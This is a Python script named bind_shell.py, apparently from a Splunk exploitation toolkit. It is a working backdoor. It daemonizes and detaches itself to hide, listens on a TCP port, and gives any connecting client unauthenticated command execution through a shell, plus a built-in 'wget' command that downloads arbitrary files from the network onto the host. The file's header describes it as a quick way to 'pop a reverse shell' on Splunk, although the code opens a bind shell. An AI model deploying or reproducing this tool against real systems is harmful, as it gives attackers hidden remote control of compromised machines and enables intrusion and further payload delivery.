#!/usr/bin/env python


#**************************************************************************#
#  Filename: bind_shell.py             (Created: 2016-08-18)               #
#                                       (Updated: 2025-01-23)              #
#  Info:                                                                   #
#    This was a very robust solution in python 2. I needed a quick and     #
#    dirty way to pop a reverse shell with newer versions of splunk;       #
#    Forgive my haste and I hope it's what you're looking for.             #
#    NOTE: This bind functionality is mostly untested.                     #
#    I reccomend the rev_shell instead.                                    #
#  Author:                                                                 #
#    Ryan Hays (The good stuff)                                            #
#    Cole Lucas (The bad stuff)                                            #
#**************************************************************************#
import os
import sys
import socket
import threading
import subprocess
import urllib.request
import urllib.error

UMASK = 0
WORKDIR = "/"
MAXFD = 1024
REDIRECT_TO = os.devnull if hasattr(os, "devnull") else "/dev/null"

try:
    SHELLTYPE = sys.argv[1]
except IndexError:
    SHELLTYPE = 'std'

try:
    BINDPORT = int(sys.argv[2])
except IndexError:
    BINDPORT = 8888

def createdaemon():
    try:
        pid = os.fork()
    except OSError as e:
        raise RuntimeError(f"{e.strerror} [{e.errno}]")

    if pid == 0:
        os.setsid()
        try:
            pid = os.fork()
        except OSError as e:
            raise RuntimeError(f"{e.strerror} [{e.errno}]")

        if pid == 0:
            os.chdir(WORKDIR)
            os.umask(UMASK)
        else:
            os._exit(0)
    else:
        os._exit(0)

    maxfd = os.sysconf("SC_OPEN_MAX") if hasattr(os, "sysconf") else MAXFD
    for fd in range(0, maxfd):
        try:
            os.close(fd)
        except OSError:
            pass

    os.open(REDIRECT_TO, os.O_RDWR)
    os.dup2(0, 1)
    os.dup2(0, 2)

    return 0

def connection_handler(conn):
    conn.setblocking(1)
    conn.sendall(b"Connection Established!\n")
    while True:
        conn.sendall(b"$ ")
        data = conn.recv(1024).decode('utf-8').strip()

        if data in ('quit', 'exit'):
            conn.close()
            break
        elif data.startswith('cd '):
            try:
                os.chdir(data[3:])
                conn.sendall(b"Changed directory successfully.\n")
            except FileNotFoundError:
                conn.sendall(b"The system path cannot be found!\n")
        elif data.startswith('wget '):
            try:
                url = data[5:]
                filename = os.path.basename(url)
                with urllib.request.urlopen(url) as response, open(filename, 'wb') as out_file:
                    out_file.write(response.read())
                conn.sendall(f"Successfully downloaded {filename}\n".encode('utf-8'))
            except Exception as e:
                conn.sendall(f"Download failed: {e}\n".encode('utf-8'))
        else:
            try:
                proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout, stderr = proc.communicate()
                conn.sendall(stdout + stderr)
            except Exception as e:
                conn.sendall(f"Command execution failed: {e}\n".encode('utf-8'))

def main():
    ret_code = createdaemon()

    if SHELLTYPE.lower() == 'std':
        try:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_socket.bind(('', BINDPORT))
            server_socket.listen(5)

            print(f"Bind shell listening on port {BINDPORT}...")

            while True:
                conn, addr = server_socket.accept()
                print(f"Connection received from {addr}")
                client_thread = threading.Thread(target=connection_handler, args=(conn,))
                client_thread.daemon = True
                client_thread.start()

        except KeyboardInterrupt:
            print("Shutting down bind shell...")
            server_socket.close()
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    main()
